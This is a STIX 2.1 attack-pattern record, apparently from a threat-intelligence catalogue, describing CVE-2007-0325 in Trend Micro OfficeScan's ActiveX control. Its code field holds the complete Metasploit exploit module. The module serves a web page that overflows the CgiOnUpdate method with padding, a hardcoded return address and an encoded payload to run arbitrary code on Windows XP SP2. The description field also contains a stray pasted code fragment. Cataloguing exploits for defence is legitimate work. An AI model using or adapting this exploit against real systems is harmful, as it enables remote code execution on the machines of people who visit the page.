{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f1aa0d9b-d4ad-4aa6-a197-29154a71690f",
    "created": "2024-08-14T16:44:04.825045Z",
    "modified": "2024-08-14T16:44:04.82505Z",
    "name": "Trend Micro OfficeScan Client ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Trend Micro OfficeScan Corporate Edition 7.3. By sending an overly long string to the \"CgiOnUpdate()\" method located in the OfficeScanSetupINI.dll Control an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/trendmicro_officescan.rb",
            "external_id": "trendmicro_officescan.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-0325"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Trend Micro OfficeScan Client ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Trend Micro OfficeScan\n        Corporate Edition 7.3. By sending an overly long string to the\n        \"CgiOnUpdate()\" method located in the OfficeScanSetupINI.dll Control,\n        an attacker may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-0325' ],\n          [ 'OSVDB', '33040' ],\n          [ 'BID', '22585' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP2 Pro English',     { 'Ret' => 0x7cc58fd8 } ],\n        ],\n      'DisclosureDate' => '2007-02-12',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n      false\n  end\n\n  def check_dependencies\n      use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    sploit =  rand_text_alpha(2149) + [target.ret].pack('V') + p.encoded\n\n    # Build out the message\n    content = %Q|\n      <html>\n      <object classid='clsid:08d75bb0-d2b5-11d1-88fc-0080c859833b' id='#{vname}'></object>\n      <script language='javascript'>\n      var #{vname} = document.getElementById('#{vname}');\n      var #{strname} = new String('#{sploit}');\n      #{vname}.CgiOnUpdate = #{strname};\n      </script>\n      </html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-02-12",
    "x_mitre_platforms": [
        "win'"
    ]
}